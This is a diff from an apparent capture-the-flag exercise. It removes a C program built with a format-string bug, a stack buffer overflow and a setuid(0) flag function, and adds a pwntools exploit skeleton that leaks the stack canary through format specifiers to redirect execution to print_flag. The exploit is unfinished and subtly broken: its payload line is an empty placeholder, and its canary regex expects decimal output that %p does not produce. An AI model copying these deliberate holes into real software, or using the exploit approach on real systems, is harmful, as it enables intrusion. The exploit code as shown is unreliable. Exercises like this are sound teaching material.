@@ -1,49 +1,25 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <time.h>
-#include <unistd.h>
+#!/usr/bin/env python3
+import re
+from pwn import *
 
-void print_flag() {
-    setuid(0);
-    char flag[64];
-    FILE *f = fopen("flag-3.txt", "r");
-    if (f == NULL) {
-        printf("Flag file is missing.\n");
-        exit(1);
-    }
-    fgets(flag, sizeof(flag), f);
-    printf("%s\n", flag);
-    fclose(f);
-}
+exe = ELF("./killing-the-canary")
 
-void setup() {
-  setbuf(stdin, NULL);
-  setbuf(stdout, NULL);
-  setbuf(stderr, NULL);
-}
+r = process([exe.path])
+# gdb.attach(r)
 
-void game() {
-    char name[20];
-    char message[64];
+r.recvuntil(b"What's your name? ")
+r.sendline(b"%11$p.%13$p.%15$p") #Add your code here
 
-    printf("Welcome to the game!\n");
-    printf("What's your name? ");
-    fgets(name, sizeof(name), stdin);
+val = r.recvuntil(b"What's your message? ")
+# log.info(val)
+canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
+log.info(f"Canary: {canary:x}")
 
-    printf("Hello, ");
-    printf(name);
-    printf("! Let's play a game.\n");
+win = exe.symbols['print_flag']
+# log.info(hex(win))
 
-    printf("What's your message? ");
-    fgets(message, 100, stdin);
+payload = # Add your payload here
+r.sendline(payload)
 
-    printf("Your message is ");
-    puts(message);
-}
-
-int main() {
-    setup();
-    game();
-    return 0;
-}
+r.recvline()
+r.interactive()
